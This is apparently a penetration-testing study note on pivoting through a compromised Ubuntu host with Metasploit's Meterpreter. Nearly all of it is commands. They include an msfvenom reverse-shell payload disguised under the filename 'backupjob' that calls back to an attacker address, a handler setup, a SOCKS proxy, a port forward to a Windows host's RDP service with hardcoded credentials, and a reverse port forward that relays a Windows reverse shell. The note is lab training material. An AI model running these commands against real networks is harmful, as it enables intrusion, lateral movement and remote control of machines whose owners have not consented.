### **Meterpreter Pivot (No SSH Required)**

When you have a Meterpreter shell on a Ubuntu pivot host, you can create a pivot directly through the session — no SSH port forwarding needed. Use a Meterpreter shell command to get a reverse shell back on your attack host (e.g., port `8080`), then run enumeration scans through it.

#### Creating Payload for Ubuntu Pivot Host
```bash
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.15.141 -f elf -o backupjob LPORT=8123
```

#### Configuring & Starting the multi/handler
```
use exploit/multi/handler 
set PAYLOAD linux/x64/meterpreter_reverse_tcp 
set LHOST 10.10.15.148 
set LPORT 8123 
set ExitOnSession false
```

> Note: It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build its arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built.

>Instead of using SSH for port forwarding, we can also use Metasploit's post-exploitation routing module `socks_proxy` to configure a local proxy on our attack host. We will configure the SOCKS proxy for `SOCKS version 4a`. This SOCKS configuration will start a listener on port `9050` and route all the traffic received via our Meterpreter session.'

#### Configuring MSF's SOCKS Proxy

```python
use auxiliary/server/socks_proxy

set SRVHOST 0.0.0.0

run
```

## Port Forwarding
#### Creating Local TCP Relay
```python
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```
- The above command  requests the Meterpreter session to start a listener on our attack host's local port (`-l`) `3300` and forward all the packets to the remote (`-r`) Windows server `172.16.5.19` on `3389` port (`-p`) via our Meterpreter session.

#### Connecting to Windows Target (via RDP) through localhost
```python
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

## Meterpreter Reverse Port Forwarding
![[Pasted image 20260317193558.png]]

Here's what's happening step by step:

1. **Meterpreter session** is already established between your attack host and the Ubuntu pivot server.
2. You run `portfwd` in reverse mode — telling the Ubuntu server to **listen on port 1234** and forward anything it receives back to your attack host on **port 8081**.
3. You also start a **listener on port 8081** on your attack host (waiting for the Windows shell).
4. When the Windows target executes its payload, it sends a reverse shell to **Ubuntu:1234**.
5. Ubuntu immediately **forwards that connection** through the Meterpreter tunnel to your **attack host on port 8081** — and you catch the shell.

#### Reverse Port Forwarding Rules
```python
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```
